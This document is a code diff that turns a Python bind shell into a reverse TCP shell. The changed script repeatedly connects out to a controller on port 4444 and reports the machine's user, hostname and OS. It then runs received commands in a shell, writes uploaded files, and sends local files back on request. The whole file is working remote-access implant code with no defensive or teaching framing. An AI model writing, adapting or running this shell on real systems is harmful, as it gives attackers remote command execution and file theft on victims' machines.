@@ -1,13 +1,23 @@
-# postive tcp
+# reverse_tcp
+host = '0.0.0.0'
 port = 4444
 
 import os
 import socket
 import platform
 import subprocess
-from threading import Thread
+from time import sleep
 
 client = socket.socket()
+
+def init(text):
+    while True:
+        try:
+            client.connect((host, port))
+            client.send(text.encode('gbk'))
+            break
+        except Exception:
+            sleep(30)
 
 def getprompt(systemv):
     if 'Linux' in systemv:
@@ -27,29 +37,29 @@ def getsystemv():
 
     return loginuser + '/' + socket.gethostname() + '/' + sysv
 
-def interexploit(server,text):
-    print("[+] Connected!")
-    try:
-        server.send(text.encode('gbk'))
-    except Exception: return
+
+if __name__ == '__main__':
+    systemv = getsystemv()
+    text = getprompt(systemv) +'`'+systemv
+    init(text)
 
     while True:
         try:
-            cmd = server.recv(1024).decode('gbk')
+            cmd = client.recv(1024).decode('gbk')
             print(cmd)
             other = cmd.split(' ')
             first = other[0]
-        except Exception: return
-
+        except Exception:
+            init(text)
+            continue
         if first == 'mantis':
             pass
-
         elif first == 'cd':
             try:
                 os.chdir(other[1])
-                server.send(getprompt(systemv).encode('gbk'))
+                client.send(getprompt(systemv).encode('gbk'))
             except Exception: # chidir
-                server.send(getprompt(systemv).encode('gbk'))
+                client.send(getprompt(systemv).encode('gbk'))
 
         elif first == 'shell':
             try:
@@ -60,38 +70,31 @@ def interexploit(server,text):
                     res = subprocess.Popen(ccmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                     result, _ = res.communicate()
                 
-                    server.send(result)
-                    server.send("``````````".encode('gbk'))
-            except Exception: return
+                    client.send(result)
+                    client.send("``````````".encode('gbk'))
+            except Exception:
+                init(text)
 
         elif first == 'upload':
             try:
                 dst = other[1]
                 fsize = int(other[2])
-                content = server.recv(fsize)
+                content = client.recv(fsize)
                 with open(dst,'wb') as f:
                     f.write(content)
-            except Exception: return
+            except Exception:
+                init(text)
 
         elif first == 'download':
             try:
                 src = other[1]
                 if os.path.isfile(src):
                     fsize = os.path.getsize(src)
-                    server.send(str(fsize).encode('gbk'))
+                    client.send(str(fsize).encode('gbk'))
                     with open(src,'rb') as f:
                         content = f.read()
-                        server.send(content)
+                        client.send(content)
                 else:
-                    server.send(b'0')
-            except Exception: return
-
-if __name__ == '__main__':
-    client.bind(('0.0.0.0',port))
-    client.listen(512)
-    systemv = getsystemv()
-    text = getprompt(systemv) +'`'+systemv
-
-    while True:
-        server, addr = client.accept()
-        Thread(target=interexploit,args=(server,text)).start()
+                    client.send(b'0')
+            except Exception:
+                init(text)
